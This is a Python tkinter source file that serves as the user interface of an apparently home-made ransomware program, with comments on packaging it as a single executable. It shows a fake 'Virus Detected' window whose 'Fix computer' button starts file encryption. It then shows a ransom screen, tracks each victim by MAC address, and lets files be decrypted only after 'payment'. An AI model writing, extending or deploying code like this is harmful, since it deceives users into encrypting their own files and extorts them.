from tkinter import *
from tkinter import messagebox
from ransom import Ransom
from KeyManager import KeyManager
from uuid import getnode as get_mac


#sudo apt-get install python3-tk
#pyinstaller --onefile --hidden-import=tkinter  GUI.py



class GUI:


    def __init__(self):
        self.window = None
        self.keyManager = KeyManager()
        self.ransom = Ransom()

        if(self.keyManager.isEncrypted(get_mac())):
            self.loadEncrypted()
        else:
            self.loadYouHaveVirus()



    def pay(self):
        self.keyManager.pay(get_mac())
        messagebox.showinfo('Thanks','Thanks you for the payment.')

    def decrypt(self):
        try:
            self.ransom.startDecryption()
            self.keyManager.removeThisMacFromDB() #Temp svo thad tharf ekki ad eyda ut ur gagnagrunni manual.
            messagebox.showinfo('Decrypted','Everything has been decrypted.')
            sys.exit()
        except Exception as error:
            print(error)
            messagebox.showwarning('Pay!','You have not payed.')
        


    def encrypt(self):
        self.ransom.encrypt()
        self.window.destroy()
        self.loadEncrypted()



    def loadEncrypted(self):
        self.window = Tk()

        self.window.title("Welcome to IGonnaMakeYourCry")
        self.window.geometry('350x200')

        lbl = Label(self.window, text="Ooops, your files have been encrypted! :(")
        lbl.grid(column=0, row=0)

        btn = Button(self.window, text="Pay", command=self.pay)
        btn.grid(column=0, row=1)

        btn = Button(self.window, text="Decrypt", command=self.decrypt)
        btn.grid(column=1, row=1)

        self.window.mainloop()


    def loadYouHaveVirus(self):
        self.window = Tk()

        self.window.title("Virus Detected")
        self.window.geometry('350x200')

        lbl = Label(self.window, text="Ooops, your computer is infected. Press button to fix.")
        lbl.grid(column=0, row=0)

        btn = Button(self.window, text="Fix computer", command=self.encrypt)
        btn.grid(column=0, row=1)

        self.window.mainloop()


gui = GUI()
